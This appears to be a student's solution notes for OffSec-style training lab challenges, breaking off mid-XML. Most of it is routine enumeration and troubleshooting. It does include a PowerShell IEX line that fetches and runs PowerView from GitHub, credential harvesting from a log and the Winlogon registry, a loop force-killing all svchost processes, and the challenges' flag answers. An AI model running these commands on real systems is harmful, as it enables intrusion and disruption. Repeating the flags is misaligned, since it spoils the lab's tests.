
# Enumerating GPO
Exercises
For this challenge, you need to enumerate the GPOs on this domain controller. There is a GPO that looks suspicious. Get more information about the GPO and you will find the flag.

The target host is joined to a domain, so you'll need to use the -d flag with rdesktop to log in as follows:
```sh

get-GPO -all

gpresult /h report.html
195.116

IEX(new-object System.Net.Webclient).Downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
get-netgpo

```


# Enumerating Groups
Exercises
For this challenge, you need to enumerate the groups inside the domain. There is a group that looks suspicious. Get more information about the group, and you will find the flag.

Hint: you can use the net command to list the groups and to get more information about them.

The target host is joined to a domain, so you'll need to use the -d flag with rdesktop to log in as follows:
```sh
get-localgroup

net localgroup
net localgroup Guests

net group /domain
PS C:\Users\Student> net group /domain "outerprise admins"
Group name     Outerprise Admins
Comment        Here is your flag: OS{d89d411bd1261cddf34e6c79e55af9b3}
```

# Enumerating Users
Exercises
For this challenge, you need to enumerate users in the domain. You will find the flag in one of the user's LDAP entries.

Hint: You can use the Get-ADUser CMDlet to enumerate users in the domain. You can also use this command with the following LDAP filter "(objectClass=user)" to find the users in the domain.

```shell
Get-ADUser -Filter * -Properties * 
OS{68c3178bff67e7b5f9400a46726b8a00}

Created                              :
Deleted                              :
Department                           :
Description                          : Here is your flag: OS{68c3178bff67e7b5f9400a46726b8a00}
DisplayName                          :
get-localuser

```

# Bash Environment
Exercises
A malicious user broke the below system in an attempt to cover their tracks but forgot one very important step. Use what they left behind to the flag.

```shell
history

student@dffd4ec00aeb:~$ /bin/cat /tmp/.tmp.QsLjOwGyUV
T1N7NWI2MzFlMzExN2IxYjU0ZWFmZjZkNWE0MDFkMTI2ODJ9Cg==

```


# Text Manipulation
Exercises
In the student user's home directory you will find two files, access-logA.txt and access-logB.txt. The flag is contained within these files. Spot the differences (and only the differences) between the two files in order of appearance to solve this challenge. You may need to format the text so that it is accepted as a proper solution in the form OS{FlagGoesHere}.

```shell
└─$ diff access-logA.txt access-logB.txt | grep '^[<>]' | awk '{print $2}' | tr '\n' ''                                                                                           
O S { e b 2 8 c 3 b a e c e f 9 0 3 7 7 9 8 d 8 3 1 9 e 5 7 0 8 3 b 8 } 


```

# Elevating Access
Exercises
Determine how you can elevate your access permissions to read flag.txt in the root's directory.
```shell
┌──(student㉿554cfed8ed01)-[~]
└─$ sudo su                                                                                                                                                                                 

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for student: 
┌──(root💀554cfed8ed01)-[/home/student]
└─# ls -la                                                                                                                                                                                  
total 40
drwxr-xr-x 2 student student  4096 Nov  8  2022 .
drwxr-xr-x 1 root    root     4096 Nov  8  2022 ..
-rw-r--r-- 1 student student   220 Oct  4  2021 .bash_logout
-rw-r--r-- 1 student student  5349 Oct 18  2021 .bashrc
-rw-r--r-- 1 student student  3526 Oct  4  2021 .bashrc.original
-rw-r--r-- 1 student student   807 Oct  4  2021 .profile
-rw-r--r-- 1 student student 10583 Sep 24  2021 .zshrc

┌──(root💀554cfed8ed01)-[/home/student]
└─# cat /root/flag.txt                                                                                                                                                                      
OS{06b7a9db8a46a7d77ecd619e4a48f118}


```

# Web Logs
Exercises
The system administrator thinks there may be an attacker on the following server who's been regularly making requests onto the local web server. You've been given enough privileges to investigate this issue. Find the file that the attacker has been requesting, and view the file to get the flag.

```shell
┌──(student㉿d9048ae8474e)-[~]
└─$ cat /var/log/apache2/access.log
127.0.0.1 - - [02/Jun/2023:17:35:26 -0400] "GET /oLKNrnhjINR HTTP/1.1" 200 239 "-" "curl/7.74.0"

┌──(student㉿d9048ae8474e)-[~]
└─$ curl http://127.0.0.1/oLKNrnhjINR 
OS{c52f46c78e9837fe20438d996f43524c}

```


# Finding and Copying Files
Exercises
There is a zip file named flag.zip that contains the flag. However, the zip file is password protected. There is another file named password.png hidden somewhere on the system, which contains the password. Find this image, copy it off the system, and then view it to get the password. Then, unzip the zip file with the password to get the flag.
```shell
$ find / -name *.png   

/usr/share/fonts/password.png

echo -n "<html><body><img src='data:image/png;base64,$(cat /var/backups/password.png| base64 | tr -d '\r\n')' /></body></html>" > outputimage.html

```

# ################################## Firewall Setup
Exercises
For this challenge, you're given an IP address of a server that's running SSH and HTTP. Your task is to configure the iptables firewall to allow connections to and from the SSH and HTTP services, while dropping all other network connections.

There is a CHALLENGE_README.md on the remote server that explains your task in further detail.

```
# CHALLENGE README

For this challenge, you need to configure the iptables firewall for this server. You will find that the iptables binary has its setuid bit set, giving you the permissions needed to configure the firewall.

To complete this challenge, you must configure the server firewall so that:

* Anyone can access the running SSH and HTTP services on this server, both remotely and locally.

* Users on the system can connect to external SSH or HTTP servers.

* All other (attempted or existing) network connections that doesn't follow the above guidelines must be dropped.

Remember that the default port for SSH is port 22, and the default port for HTTP is port 80. You will want to use these port numbers when configuring your firewall rule.

Once you think you have finished configuring the iptables firewall rules, run `sudo -u challenge /usr/bin/python3 /home/challenge/check_answer.py` in order to get the flag.

IMPORTANT: The order in which you execute commands matters when you're configuring iptables rules. While the check_answer.py script won't check for the rules you wrote for port 22, if you decide to configure the
default policy first before you add an exception for port 22, iptables will drop your existing SSH connection before you add the exception, forcing you to revert the challenge instance. It is therefore HIGHLY 
RECOMMENDED to avoid configuring default policy until the very end, as well as triple-check your ACCEPT rules to make sure they're correct before configuring the default firewall policy.

```

```sh
IF YOU ARE CONNECTING ON PORT 2222 YOU WILL NEED TO ADD IT ALSO 


#LIST ALL IPTABLES RULES
iptables -L -n -v

#delete by rule numer
iptables -D INPUT 3
# or by matching criteria
iptables -D INPUT -p tcp --dport 22 -j ACCEPT





# Allow established SSH connection
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow incoming SSH (port 22) connections
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Allow incoming HTTP (port 80) connections
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Set default policy to drop incoming traffic
iptables -P INPUT DROP
iptables -P FORWARD DROP







# Allow incoming SSH connections
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
# Allow incoming HTTP connections
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
# Allow outgoing SSH connections
iptables -A OUTPUT -p tcp --dport 22 -j ACCEPT
# Allow outgoing HTTP connections
iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
# Drop all other incoming and outgoing connections
iptables -A INPUT -j DROP
iptables -A OUTPUT -j DROP







iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Allow incoming HTTP connections
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Allow outgoing SSH connections
iptables -A OUTPUT -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

# Allow outgoing HTTP connections
iptables -A OUTPUT -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT

# Drop all other incoming and outgoing connections
iptables -A INPUT -j DROP
iptables -A OUTPUT -j DROP






2
sudo​ iptables -A INPUT -p tcp --dport ​22​ -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
sudo​ iptables -A OUTPUT -p tcp --sport ​22​ -m conntrack --ctstate ESTABLISHED -j ACCEPT










```




# Service Troubleshooting
Exercises
An administrator attempted to configure the flag-service service to run on this system via systemctl, but they made some mistakes. You will need to run some tools as root to solve this challenge and have been given appropriate access to facilitate these actions through sudo. Troubleshoot the admin's errors, get the service working, and then interact with the service to get the flag.
```shell
systemctl status "flag-service"
sudo systemctl start "flag-service.service"


systemctl list-units --type=service --all



sudo systemctl status udev.service

systemctl status [servicename]
journalctl -f -t [servicename]
    - alternative `tail -f /var/log/messages`

# is the script executable
sudo chmod +x /path


# is it enabled
systemctl enable FOSSLinux

#check syntax of service
systemd-analyze verify /etc/systemd/system/my-custom-service.service


```


# Network Traffic
Exercises
In this challenge, there is a background process running on the target that regularly sends an HTTP request to a locally running web server on port 80. To obtain the flag, you'll need to use the tcpdump utility to capture network traffic into a PCAP file and then analyze it with Wireshark. Don't forget to run tcpdump with elevated privileges. In addition, you may want to listen on all network interfaces. Listening for 1 to 2 minutes should be sufficient to capture the needed traffic.
```shell
#run for 2 minutes!
sudo tcpdump -i any -A -v > output.pcap
grep -i "OS{" output.pcap


#sometimes it can be url encoded so need to check 
    localhost.41736 > localhost.https: Flags [.], cksum 0xfe28 (incorrect -> 0x5e7e), ack 1, win 512, options [nop,nop,TS val 3836076697 ecr 3836076697], length 0
22:41:05.498270 lo    In  IP (tos 0x0, ttl 64, id 54500, offset 0, flags [DF], proto TCP (6), length 252)
    localhost.41736 > localhost.https: Flags [P.], cksum 0xfef0 (incorrect -> 0xe3b2), seq 1:201, ack 1, win 512, options [nop,nop,TS val 3836076697 ecr 3836076697], length 200
........GET /register?cmd=OS%7B93d69083a0253446040e01d3038faccb%7D%0A HTTP/1.1

```


# Malicious ARP
Exercises
For this challenge, the sysadmins have discovered a malicious ARP entry inside this linux instance. Your task is to identify and remove the malicious ARP entry. Once it's removed, you will find the flag at /home/student/flag.txt.

Note: In order to remove ARP entries, you may also want to specify the interface by using the -i option in the arp command.
```shell
#query
student@soc100assessment:~$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.195.254          ether   00:50:56:bf:3e:8b   C                     ens192
172.16.23.194            ether   00:50:56:8a:73:26   CM                    ens192
student@soc100assessment:~$ arp -d 172.16.23.194
SIOCDARP(dontpub): Network is unreachable
student@soc100assessment:~$ arp -d 172.16.23.194 -i ens192

 

```


# Mystery Function
Exercises
This PowerShell session that's running on this system has a strange function loaded into it. SSH into the system, determine what the function is, and run it to get the flag.

Hint: You may want to look at PowerShell providers first.

```shell
Get-Command -ListImported

```

# Mystery Module
Exercises
There is a mysterious PowerShell module that's installed and made available to use on this system. SSH into the system, identify the PowerShell module, and find out how to run its commands to get the flag.
```shell
get-module -ListAvailable [expects a flag]        
Get-Command -Module <ModuleName>
PS /home/student> import-module FlagOutputModule
PS /home/student> DisplayChallengeFlag
Missing or incorrect key! See help for details.
PS /home/student> get-command -module FlagOutputModule

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        DisplayChallengeFlag                               0.0        FlagOutputModule

PS /home/student> DisplayChallengeFlag - 
Missing or incorrect key! See help for details.
PS /home/student> DisplayChallengeFlag --help
Missing or incorrect key! See help for details.
PS /home/student> get-help DisplayChallengeFlag

NAME
    DisplayChallengeFlag
    
SYNOPSIS
    Prints out the flag
    
    
SYNTAX
    DisplayChallengeFlag [[-key] <String>] [<CommonParameters>]
    
    
DESCRIPTION
    This function prints out the flag for this assessment. Requires the key parameter to be set to "oK5x7fk39Jj4".
    

RELATED LINKS

REMARKS
    To see the examples, type: "Get-Help DisplayChallengeFlag -Examples"
    For more information, type: "Get-Help DisplayChallengeFlag -Detailed"
    For technical information, type: "Get-Help DisplayChallengeFlag -Full"


PS /home/student> DisplayChallengeFlag -key "oK5x7fk39Jj4"
OS{191a6257f15b0d4157113568098775a7}

```

# Apache Log Parsing
Exercises
Write an apache log parser. There is a /home/student/CHALLENGE_README.md file inside the instance that provides an example of this challenge and demonstrates how to handle edge cases. Once your script is complete, run ./challenge to get the flag.
```py
import sys
import shlex #only needed if apachelogs cannot be pip'd

"""
You may want to create desired functions here.
"""

if __name__ == "__main__":

    """
    You may want to do the file operations here.
    """
    inputFile = sys.argv[1]
    outputFile = sys.argv[2]
    output = []
    with open(inputFile, 'r') as fp:
        for line in fp:
            item = shlex.split(line)
            if (item[6] == "200"):
                #print (item[0])
                output.append(item[0])

    with open(outputFile, 'w') as fp:
        for item in output:
            # write each item on a new line
            fp.write("%s\n" % item)



```


# Python Troubleshooting
Exercises
For this challenge, you need to troubleshoot the already implemented python script found in student_solution.py. The author of this script attempted to write a script that determines if a given year is a leap year or not, but the author made several mistakes. These mistakes may include syntax (coding) errors as well as logic errors. Fix the author's mistakes to solve this challenge.

You do NOT need to and should not implement any additional functionality; just fix the errors. The comments in the code provide additional information about the functionality of the script, and there is an additional copy of the broken script in student_solution.py.backup if needed. There is a /home/student/CHALLENGE_README.md file that has example usage of the script.

```
└─$ cat CHALLENGE_README.md                                                                                                                                                               
# CHALLENGE README

For this challenge, you need to troubleshoot the already implemented python script found in `student_solution.py`. 
The author of this script attempted to write a script that determines if a given year is a leap year or not, 
but the author made several mistakes. These mistakes may include syntax (coding) errors as well as logic errors. 
Fix the author's mistakes to solve this challenge. You do NOT need to and should not implement any additional functionality;
just fix the errors. The comments in the code provide additional information about the functionality of the script, and there
is an additional copy of the broken script in `student_solution.py.backup` if needed. Once complete with fixing the errors,
run `./challenge` to get the flag.

Below is an example usage for your script.

┌──(student㉿049662a72423)-[~]
└─$ ./student_solution.py 2004
2004 is a leap year.

┌──(student㉿049662a72423)-[~]
└─$ ./student_solution.py 1700
1700 is not a leap year.

┌──(student㉿049662a72423)-[~]
└─$ ./student_solution.py 2006
2006 is not a leap year.

┌──(student㉿049662a72423)-[~]
└─$ ./student_solution.py 2400
2400 is a leap year.

```

```py
#!/usr/bin/env python3

import sys


ARGCOUNT = len(sys.argv) - 1

if ARGCOUNT != 1:
        print("Error: Incorrect number of arguments.") #Print this if the user runs this with the incorrect number of arguments
        exit(1)

ARG_1 = sys.argv[1]

if int(ARG_1) % 100 == 0:
        if int(ARG_1) % 400 == 0:
                print(str(ARG_1) + " is a leap year.")
        else:
                print(str(ARG_1) + " is not a leap year.")
        exit(0)
else:
        if int(ARG_1) % 4 == 0:
                print(str(ARG_1) + " is a leap year.")
        else:
                print(str(ARG_1) + " is not a leap year.")

```




# Finding Flag
Exercises
The flag has been hidden somewhere on the file system. However, the file has the extension of .flag. Use this knowledge to find the flag and get read its contents.
```shell
cd c:\
dir "*.flag" /s

```







# Finding Password
Exercises
For this challenge, you need to find a user's credentials in a system.log file and then retrieve the flag from the Administrator user's desktop.

```sh

dir "system.log" /s

select-string -path C:\windows\system.log -Pattern "password"  
C:\windows\system.log:4242:4505=Username:Yuri;Password:PiecemealBelittleMicrobe621


4505=Username:Zoey;Password:PiecemealBelittleMicrobe621




```



#               Registry Elevation
Exercises
Another interesting registry location is HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon, which contains information regarding what user will automatically log on upon system startup.

The sysadmin on this remote server has configured auto-logon for a local user. Find a way to elevate access to execute commands as that user and get the flag located on that local user's desktop folder.
```sh

# look for password
Get-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

PS C:\Users\Student> Get-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"


    Hive: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion


Name                           Property
----                           --------
Winlogon                       AutoRestartShell             : 1
                               Background                   : 0 0 0
                               CachedLogonsCount            : 10
                               DebugServerCommand           : no
                               DefaultDomainName            : OFFSEC
                               DefaultUserName              : Taylor
                               DisableBackButton            : 1
                               EnableSIHostIntegration      : 1
                               ForceUnlockLogon             : 0
                               LegalNoticeCaption           :
                               LegalNoticeText              :
                               PasswordExpiryWarning        : 5
                               PowerdownAfterShutdown       : 0
                               PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
                               ReportBootOk                 : 1
                               Shell                        : explorer.exe
                               ShellAppRuntime              : ShellAppRuntime.exe
                               ShellCritical                : 0
                               ShellInfrastructure          : sihost.exe
                               SiHostCritical               : 0
                               SiHostReadyTimeOut           : 0
                               SiHostRestartCountLimit      : 0
                               SiHostRestartTimeGap         : 0
                               Userinit                     : C:\Windows\system32\userinit.exe,
                               VMApplet                     : SystemPropertiesPerformance.exe /pagefile
                               WinStationsDisabled          : 0
                               scremoveoption               : 0
                               DisableCAD                   : 1
                               LastLogOffEndTimePerfCounter : 2187308510
                               ShutdownFlags                : 2147484203
                               DisableLockWorkstation       : 0
                               AutoAdminLogon               : 1
                               DefaultPassword              : SecPassword1

flag is on users desktop c:\users\taylor\desktop\flag.txt

```


# Firewall Rules window
Exercises
For this challenge, you need to enumerate firewall rules. You will find a firewall rule that has the flag in it.
```sh
Get-NetFirewallRule

 Get-NetFirewallRule | select-object Description | select-string "OS{"

Name                          : {699114f5-b103-4e56-8d02-ed1a80d03d95}
DisplayName                   : Flag Fwrule
Description                   : Here is your flag: OS{fa3d74569a2e02970d2021a00578b366}

```



#               Malicious Service
Exercises
There is a process on this windows host that is trying to impersonate the svchost.exe system process. However, since a malicious service is spawning the process, just killing the process won't work.

Find the malicious process, figure out what service is starting the malicious process, and stop the malicious service in order to get the flag. Once the malicious service has been STOPPED, the flag will appear after a few seconds at C:\Users\Student\Desktop\flag.txt.

Note: The service is configured to be stoppable by the Student user, so you don't need to worry about needing the required permissions to stop/enumerate the service.

```sh
Get-CIMInstance -Class Win32_Service -Filter "PathName like '%svchost.exe%' " | Select-Object *
https://ss64.com/nt/syntax-services.html






get-service | select-object -Property * | where-object {$_.CanStop -eq $True -and $_.Status -eq "Running"}        
Get-WmiObject win32_service | ?{$_.Name -like '*'} | select Name, DisplayName, State, PathName
PS C:\Users\Student> get-service | where-object {$_.status -eq "Running"}

Status   Name               DisplayName
------   ----               -----------
Running  ADWS               Active Directory Web Services
Running  Appinfo            Application Information
Running  AppReadiness       App Readiness
Running  AppXSvc            AppX Deployment Service (AppXSVC)
Running  BFE                Base Filtering Engine
Running  BrokerInfrastru... Background Tasks Infrastructure Ser...
Running  camsvc             Capability Access Manager Service
Running  cbdhsvc_1bdfb0     Clipboard User Service_1bdfb0
Running  CDPSvc             Connected Devices Platform Service
Running  CDPUserSvc_1bdfb0  Connected Devices Platform User Ser...
Running  CertPropSvc        Certificate Propagation
Running  ClipSVC            Client License Service (ClipSVC)
Running  COMSysApp          COM+ System Application
Running  CoreMessagingRe... CoreMessaging
Running  CryptSvc           Cryptographic Services
Running  DcomLaunch         DCOM Server Process Launcher
Running  Dfs                DFS Namespace
Running  DFSR               DFS Replication
Running  Dhcp               DHCP Client
Running  DiagTrack          Connected User Experiences and Tele...
Running  DispBrokerDeskt... Display Policy Service
Running  DNS                DNS Server
Running  Dnscache           DNS Client
Running  DPS                Diagnostic Policy Service
Running  DsmSvc             Device Setup Manager
Running  DsSvc              Data Sharing Service
Running  EventLog           Windows Event Log
Running  EventSystem        COM+ Event System
Running  FontCache          Windows Font Cache Service
Running  gpsvc              Group Policy Client
Running  IKEEXT             IKE and AuthIP IPsec Keying Modules
Running  iphlpsvc           IP Helper
Running  IsmServ            Intersite Messaging
Running  Kdc                Kerberos Key Distribution Center
Running  KeyIso             CNG Key Isolation
Running  LanmanServer       Server
Running  LanmanWorkstation  Workstation
Running  lmhosts            TCP/IP NetBIOS Helper
Running  LSM                Local Session Manager
Running  mpssvc             Windows Defender Firewall
Running  MSDTC              Distributed Transaction Coordinator
Running  NcbService         Network Connection Broker
Running  Netlogon           Netlogon
Running  Netman             Network Connections
Running  netprofm           Network List Service
Running  NlaSvc             Network Location Awareness
Running  nsi                Network Store Interface Service
Running  PcaSvc             Program Compatibility Assistant Ser...
Running  PlugPlay           Plug and Play
Running  PolicyAgent        IPsec Policy Agent
Running  Power              Power
Running  ProfSvc            User Profile Service
Running  RasMan             Remote Access Connection Manager
Running  RpcEptMapper       RPC Endpoint Mapper
Running  RpcSs              Remote Procedure Call (RPC)
Running  SamSs              Security Accounts Manager
Running  Schedule           Task Scheduler
Running  SENS               System Event Notification Service
Running  ServiceHost        ServiceHost
Running  SessionEnv         Remote Desktop Configuration
Running  ShellHWDetection   Shell Hardware Detection
Running  Spooler            Print Spooler
Running  SstpSvc            Secure Socket Tunneling Protocol Se...
Running  StateRepository    State Repository Service
Running  StorSvc            Storage Service
Running  SysMain            SysMain
Running  SystemEventsBroker System Events Broker
Running  TabletInputService Touch Keyboard and Handwriting Pane...
Running  TermService        Remote Desktop Services
Running  Themes             Themes
Running  TimeBrokerSvc      Time Broker
Running  TokenBroker        Web Account Manager
Running  UALSVC             User Access Logging Service
Running  UmRdpService       Remote Desktop Services UserMode Po...
Running  UserManager        User Manager
Running  UsoSvc             Update Orchestrator Service
Running  vds                Virtual Disk
Running  VGAuthService      VMware Alias Manager and Ticket Ser...
Running  vm3dservice        VMware SVGA Helper Service
Running  VMTools            VMware Tools
Running  W32Time            Windows Time
Running  WaaSMedicSvc       Windows Update Medic Service
Running  Wcmsvc             Windows Connection Manager
Running  WdiSystemHost      Diagnostic System Host
Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
Running  Winmgmt            Windows Management Instrumentation
Running  WinRM              Windows Remote Management (WS-Manag...
Running  wlidsvc            Microsoft Account Sign-in Assistant
Running  WpnService         Windows Push Notifications System S...
Running  WpnUserService_... Windows Push Notifications User Ser...
Running  wuauserv           Windows Update
```



```

# Get all instances of the process "svchost.exe"
$processes = Get-CimInstance Win32_Process -Filter "Name='svchost.exe'"

# Loop through each process and kill it
foreach ($process in $processes) {
    try {
    $processID = $process.ProcessId
    #Write-Host "Killing process ID: $processID"
    #Write-host $process
    
    Stop-Process -Id $processID -Force -ErrorAction SilentlyContinue
    write-host $process
    
    } catch {
        
    }

}


```


# JSON Base Conversion
Exercises
For this challenge, you need to implement the python script found in student_solution.py. The script takes in a path to a json file as a command line argument, and it needs to determine whether the two numbers in their respective base representations within the json file are equal or not. If the numbers are equal, the script needs to print "1", and if the numbers are not equal, the script needs to print "0".

Further details such as the format of the json file and the bases you need to worry about are in /home/student/CHALLENGE_README.md. Once you think you have finished implementing the script, run ./challenge to get the flag.

```
└─$ cat CHALLENGE_README.md                                                                                                                                                               
# CHALLENGE README

For this challenge, you need to finish a script `student_solution.py` that takes in a path to a json file as a command line argument. 
The structure of the json data in the json file is the following:

```
{"Values": [
  {"Number": "10",
   "Base": 10
  },

  {"Number": "1",
   "Base": 2
  }
 ]
}
```
where the `Number` and `Base` fields may differ between json files.

The script needs to determine whether the two numbers in their respective base representations are equal or not.
If the numbers are equal, the script needs to print "1", and if the numbers are not equal, the script needs to print "0".

The only bases your script needs to handle are 10 and 2. Some example json files are provided for you to test your script against.


Once you think you have finished the script `student_solution.py`, run the `./challenge` binary to get your flag.
```

```
└─$ cat student_solution.py                                                                                                                                                               
#/usr/bin/env python3
#Note: when you cast a string to an int, you can also specify the base the string needs to be interpreted as in the second parameter.
#For example, int("0xa", 16) will return 10 in base 10, because it's interpreting the 0xa as a base-16 value.


# What python modules do you import?
import os, sys

if len(sys.argv) != 2:
    print("Error: Incorrect number of arguments.")
    print("Usage: python3 " + sys.argv[0] + " [json-file]")
    exit(-1)

filename = sys.argv[1] #filename should now contain the path to the json file.
if not os.path.exists(filename):
    print("Error: Json file does not exist.")
    exit(-1)


isEqual = False
#Implement your json parsing code here:






#####
if isEqual:
    print("1")
else:
    print("0")


```
C:\dev\git\bravo\code\python\scripts\parsejson.py







# XML Parsing
Exercises
In the student user's home directory you will find a xml file named flag.xml. This XML file contains a list of visitors, where each User has a fname, lname, uid, and comment field. Your task is to fetch the contents of the comment field starting from the top of the xml file.

Once you concatenate all the contents of the comment fields for each user, you can get the flag by hex decoding the resulting hex-string to ascii bytes.

C:\dev\git\bravo\code\python\scripts\getnodesxml.py

```

└─$ cat flag.xml
<Visitors><User><fname>alice</fname><comment /><lname>brandon</lname><uid>0</uid></User><User><fname>ivan</fname><comment /><lname>charlie</lname><uid>1</uid></User><User><fname>charlie</fname><comment /><lname>vincentwilson</lname><uid>2</uid></User><User><fname>jasmine</fname><comment /><lname>raina</lname><uid>3</uid></User><User><fname>ulysses</fname><comment /><lname>phoebe</lname><uid>4</uid></User><User><fname>ivan</fname><comment /><lname>ivan</lname><uid>5</uid></User><User><fname>ivan</fname><comment /><lname>amelia</lname><uid>6</uid></User><User><fname>ian</fname><comment /><lname>ethan</lname><uid>7</uid></User><User><fname>grace</fname><comment /><lname>bob</lname><uid>8</uid></User><User><fname>trinity</fname><comment /><lname>oscar</lname><uid>9</uid></User><User><fname>jasmine</fname><comment /><lname>raina</lname><uid>10</uid></User><User><fname>vincentwilson</fname><comment /><lname>ivan</lname><uid>11</uid></User><User><fname>kevin</fname><comment /><lname>george</lname><uid>12</uid></User><User><fname>henry</fname><comment /><lname>yuri</lname><uid>13</uid></User><User><fname>taylor</fname><comment /><lname>kevin</lname><uid>14</uid></User><User><fname>marcus</fname><comment /><lname>clara</lname><uid>15</uid></User><User><fname>zander</fname><comment /><lname>kevin</lname><uid>16</uid></User><User><fname>oscar</fname><comment /><lname>diego</lname><uid>17</uid></User><User><fname>emily</fname><comment /><lname>irene</lname><uid>18</uid></User><User><fname>victoria</fname><comment /><lname>taylor</lname><uid>19</uid></User><User><fname>george</fname><comment /><lname>hector</lname><uid>20</uid></User><User><fname>kaylee</fname><comment /><lname>diego</lname><uid>21</uid></User><User><fname>felix</fname><comment /><lname>alice</lname><uid>22</uid></User><User><fname>lana</fname><comment /><lname>lilly</lname><uid>23</uid></User><User><fname>nelson</fname><comment /><lname>oscar</lname><uid>24</uid></User><User><fname>nelson</fname><comment /><lname>emily</lname><uid>25</uid></User><User><fname>olivia</fname><comment /><lname>fiona</lname><uid>26</uid></User><User><fname>yuri</fname><comment /><lname>victoria</lname><uid>27</uid></User><User><fname>jasmine</fname><comment /><lname>quinn</lname><uid>28</uid></User><User><fname>felix</fname><comment /><lname>bridget</lname><uid>29</uid></User><User><fname>hector</fname><comment /><lname>lana</lname><uid>30</uid></User><User><fname>brandon</fname><comment /><lname>hector</lname><uid>31</uid></User><User><fname>ian</fname><comment /><lname>holly</lname><uid>32</uid></User><User><fname>irene</fname><comment /><lname>olivia</lname><uid>33</uid></User><User><fname>ulysses</fname><comment /><lname>lilly</lname><uid>34</uid></User><User><fname>charlie</fname><comment /><lname>alexander</lname><uid>35</uid></User><User><fname>yvette</fname><comment /><lname>felix</lname><uid>36</uid></User><User><fname>frank</fname><comment /><lname>holly</lname><uid>37</uid></User><User><fname>yvette</fname><comment /><lname>clara</lname><uid>38</uid></User><User><fname>olivia</fname><comment /><lname>phoebe</lname><uid>39</uid></User><User><fname>luke</fname><comment /><lname>olivia</lname><uid>40</uid></User><User><fname>charlie</fname><comment /><lname>wendy</lname><uid>41</uid></User><User><fname>jasmine</fname><comment /><lname>marcus</lname><uid>42</uid></User><User><fname>ian</fname><comment /><lname>jasmine</lname><uid>43</uid></User><User><fname>trinity</fname><comment /><lname>jane</lname><uid>44</uid></User><User><fname>xavier</fname><comment /><lname>zander</lname><uid>45</uid></User><User><fname>bridget</fname><comment /><lname>charlie</lname><uid>46</uid></User><User><fname>raina</fname><comment /><lname>marcus</lname><uid>47</uid></User><User><fname>nelson</fname><comment /><lname>kevin</lname><uid>48</uid></User><User><fname>lilly</fname><comment /><lname>amelia</lname><uid>49</uid></User><User><fname>taylor</fname><comment /><lname>grace</lname><uid>50</uid></User><User><fname>miguel</fname><comment /><lname>maria</lname><uid>51</uid></User><User><fname>yvette</fname><comment /><lname>brandon</lname><uid>52</uid></User><User><fname>hector</fname><comment /><lname>jasmine</lname><uid>53</uid></User><User><fname>grace</fname><comment /><lname>victoria</lname><uid>54</uid></User><User><fname>trinity</fname><comment /><lname>robert</lname><uid>55</uid></User><User><fname>charlie</fname><comment /><lname>zoey</lname><uid>56</uid></User><User><fname>felix</fname><comment /><lname>jane</lname><uid>57</uid></User><User><fname>bob</fname><comment /><lname>zoey</lname><uid>58</uid></User><User><fname>lilly</fname><comment /><lname>clara</lname><uid>59</uid></User><User><fname>ivan</fname><comment /><lname>sarah</lname><uid>60</uid></User><User><fname>miguel</fname><comment /><lname>patrick</lname><uid>61</uid></User><User><fname>zoey</fname><comment /><lname>charlie</lname><uid>62</uid></User><User><fname>peter</fname><comment /><lname>raina</lname><uid>63</uid></User><User><fname>ursula</fname><comment /><lname>alice</lname><uid>64</uid></User><User><fname>sarah</fname><comment /><lname>quinn</lname><uid>65</uid></User><User><fname>fiona</fname><comment /><lname>marcus</lname><uid>66</uid></User><User><fname>kaylee</fname><comment /><lname>taylor</lname><uid>67</uid></User><User><fname>ivan</fname><comment /><lname>nathan</lname><uid>68</uid></User><User><fname>clara</fname><comment /><lname>ethan</lname><uid>69</uid></User><User><fname>dana</fname><comment /><lname>charlie</lname><uid>70</uid></User><User><fname>miguel</fname><comment /><lname>nelson</lname><uid>71</uid></User><User><fname>sophie</fname><comment /><lname>charlie</lname><uid>72</uid></User><User><fname>charlie</fname><comment /><lname>ivan</lname><uid>73</uid></User><User><fname>ulysses</fname><comment /><lname>irene</lname><uid>74</uid></User><User><fname>lilly</fname><comment /><lname>bob</lname><uid>75</uid></User><User><fname>maria</fname><comment /><lname>grace</lname><uid>76</uid></User><User><fname>brandon</fname><comment /><lname>ivan</lname><uid>77</uid></User><User><fname>lilly</fname><comment /><lname>frank</lname><uid>78</uid></User><User><fname>thomas</fname><comment /><lname>yuri</lname><uid>79</uid></User><User><fname>peter</fname><comment /><lname>amelia</lname><uid>80</uid></User><User><fname>raina</fname><comment /><lname>ivan</lname><uid>81</uid></User><User><fname>marcus</fname><comment /><lname>emily</lname><uid>82</uid></User><User><fname>jane</fname><comment /><lname>nathan</lname><uid>83</uid></User><User><fname>henry</fname><comment /><lname>dana</lname><uid>84</uid></User><User><fname>peter</fname><comment /><lname>brandon</lname><uid>85</uid></User><User><fname>sarah</fname><comment /><lname>wendy</lname><uid>86</uid></User><User><fname>miguel</fname><comment /><lname>brandon</lname><uid>87</uid></User><User><fname>zoey</fname><comment /><lname>james</lname><uid>88</uid></User><User><fname>trinity</fname><comment 